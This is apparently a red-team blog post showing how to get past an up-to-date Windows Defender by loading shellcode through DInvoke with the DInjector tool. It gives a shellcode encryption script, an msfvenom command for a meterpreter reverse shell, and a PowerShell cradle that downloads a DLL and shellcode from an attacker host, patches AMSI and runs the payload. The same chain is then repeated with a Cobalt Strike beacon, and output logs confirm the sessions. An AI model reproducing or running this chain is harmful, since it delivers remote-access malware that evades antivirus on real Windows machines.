---
layout: single
title: "Making use of DInvoke as a better Antivirus Evasion practice, avoiding PInvoke & API Hooks"
date: 2021-10-26
tags:  
  - windows
  - dinvoke
  - windows-defender
author_profile: true
---
![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/defender.webp)

Hello back fellow red teamers!!  

Lately I have been focused on Windows stuff, such as excercises on trying to bypass Windows Defender through trial and errors etc as a practice to upgrade my own skills on red teaming.

In this article I'm going to explain how you can make use of Dynamic Invocation instead of PInvoke for a less suspicios execution.

First let's take a view at this repository :

- [https://github.com/TheWover/DInvoke](https://github.com/TheWover/DInvoke)

## What is DInvoke?
 
>*DInvoke is a dynamic replacement for PInvoke and contains powerful primitives that can be combined to dynamically invoke unmanaged code from disk or from memory.
It helps you use unmanaged code from C# while avoiding suspicious P/Invokes. Rather than statically importing API calls with PInvoke, you may use Dynamic Invocation to load the DLL at runtime and call the function using a pointer to its location in memory. You may call arbitrary unmanaged code from memory (while passing parameters), allowing you to bypass API hooking in a variety of ways and execute post-exploitation payloads reflectively.*

Rather than using PInvoke to import the API calls that we want to use, we load a DLL into memory manually. This can be done using whatever mechanism you would prefer. Then, we get a pointer to a function in that DLL. We may call that function from the pointer while passing in our parameters.

By leveraging this dynamic loading API rather than the static loading API that sits behind PInvoke, you avoid directly importing suspicious API calls into your .NET Assembly.

## Practical Example of DInvoke to Shellcode Execution

To show that little proof of concept of how it is done at a concrete target I will use [DInjector](https://github.com/snovvcrash/DInjector)

![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img1.png)

DInjector is a tool which is fully ported on `DInvoke` APIs and simulates the concept of executing code through dynamic invocation in easier steps for people like me who are generally dumb.

Below is shown the content of `encrypter.py` which takes a raw shellcode payload and encodes it using either `AES` or `XOR` up to your preference.


```python
#!/usr/bin/env python3

import os
import hashlib
from base64 import b64encode
from argparse import ArgumentParser

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


class AES:

	def __init__(self, password, iv): 
		self.key = hashlib.sha256(password.encode()).digest()
		self.iv = iv

	def encrypt(self, raw):
		backend = default_backend()
		padder = padding.PKCS7(128).padder()
		raw = padder.update(raw) + padder.finalize()
		cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=backend)
		encryptor = cipher.encryptor()
		return self.iv + encryptor.update(raw) + encryptor.finalize()


def parse_args():
	parser = ArgumentParser()
	parser.add_argument('shellcode_bin', action='store', type=str)
	parser.add_argument('-p', '--password', action='store', type=str, required=True)
	parser.add_argument('-a', '--algorithm', action='store', type=str, default='aes', choices=['aes', 'xor'])
	parser.add_argument('-o', '--output', action='store', type=str)
	parser.add_argument('--base64', action='store_true', default=False)
	return parser.parse_args()


if __name__ == '__main__':
	args = parse_args()

	with open(args.shellcode_bin, 'rb') as fd:
		shellcode = fd.read()

	if args.algorithm == 'aes':
		iv = os.urandom(16)
		ctx = AES(args.password, iv)
		enc = ctx.encrypt(shellcode)
	elif args.algorithm == 'xor':
		enc = bytearray(b ^ ord(args.password) for b in shellcode)

	if args.base64:
		print(b64encode(enc).decode())
	else:
		with open(args.output, 'wb') as fd:
			fd.write(enc)
		print(f'[+] Encrypted shellcode file: {args.output}')
```

>*OK? WHATS NEXT?*

Of course I need to compile the ``DInjector`` project which will output the `.DLL` file that is going to be loaded into the memory in order to call the shellcode.

I could use Visual Studio to compile the DLL project but doing everything in linux just fits in perfectly. I wasnt aware there was a developer tool such as ``monodeveloper`` which could handle `C#` and `.NET` compiling on linux.

![img1](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/DInjector1.png)

The walkthrough after compiling the DLL is pretty much straightforwards, I am going to create a meterpreter shellcode and have the output as raw : 

```bash
pi0x73@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=192.168.88.142 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 906 bytes
Saved as: shellcode.bin
```

Encryping the shellcode and setting up a listener which will serve the files that we need to load on the target machine : 

![img2](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img2.png)

Before executing let's make sure Windows Defender is up to date.

![img3](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img3.png)

To load the DLL into the memory and call the shellcode you can use ``cradle.ps1`` which is part of the ``DInjector`` repo.

```powershell
# MODULE
$M = "currentthread"

# LHOST
$H = "192.168.88.142"

# AMSI
$A = "true"

# DLL
$D = "DInjector.dll"

# SHELLCODE
$S = "enc"

# PASSWORD
$P = "hahaWOW!!encrypt"

# PROCESS
$N = "notepad"

# IMAGE
$I = "C:\Windows\System32\svchost.exe"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreadsuspended")
if ($methods.Contains($M)) {
    $N = (Start-Process -WindowStyle Hidden -PassThru $N).Id
}

$cmd = "$M /am51:$A /sc:http://$H/$S /password:$P /pid:$N /image:$I"

$data = (IWR -UseBasicParsing "http://$H/$D").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd.Split(" ")))
```

Clean execution , no trigger of the Antivirus and a functional meterpreter session!  
It succesfully beat a fully updated Windows Defender, I was surprised!

![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img4.png)

## Migrating to Cobaltstrike

The process would be quite similar on cobaltstrike as well. Here we use a RAW x64 beacon instead of the msfvenom shellcode.

![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/cobalt1.png)

![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/cobalt2.png)

Afterwards we go on to encode the generated shellcode one more time :

![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/cobalt3.png)

Lastly initiate a web server to serve the shellcode and execute ``cradle.ps1`` once more at the target :

```zsh
➜  DInjector git:(main) ✗ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```powershell
PS C:\users\pi0x73\Downloads> ./cradle.ps1
(AM51) [+] NtProtectVirtualMemory
(AM51) [>] Patching at address: 7FFA13B535E0
(AM51) [+] NtProtectVirtualMemory
(Detonator) [*] Loading sc from URL
(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE
(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ
(CurrentThread) [+] NtCreateThreadEx
```
And there it pops up! 

![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/cobalt4.png)

```console
beacon> sleep 0 0
[*] Tasked beacon to become interactive
beacon> shell whoami && sysinfo
[*] Tasked beacon to run: whoami
[+] host called home, sent: 64 bytes
[+] received output:
desktop-m8om60q\pi0x73
```

![gif](https://c.tenor.com/z6X-NO4N6TwAAAAd/metasploit-meterpreter.gif)

Not funny eh? I should have made use of that gif earlier :( 

Anyways... from here you can put in use the awesome functionalities of cobaltstrike and have a more efficent testing.

### References

Most of the ``DInvoke`` concept explaination paragraphs are based on [https://thewover.github.io/Dynamic-Invoke/](https://thewover.github.io/Dynamic-Invoke/)
